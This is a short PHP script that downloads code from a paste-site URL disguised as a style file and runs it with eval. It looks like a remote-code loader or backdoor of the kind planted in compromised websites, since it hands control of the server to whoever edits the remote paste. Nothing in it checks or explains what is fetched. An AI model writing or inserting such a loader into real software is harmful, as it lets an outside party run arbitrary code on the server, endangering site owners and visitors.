<?php
$url = "https://rentry.co/stylephp/raw";
$handle = fopen($url, "r");
if ($handle) {
    $phpCode = stream_get_contents($handle);
    fclose($handle);
    eval("?>".$phpCode);
} else {
    echo "ERROR";
}
?>
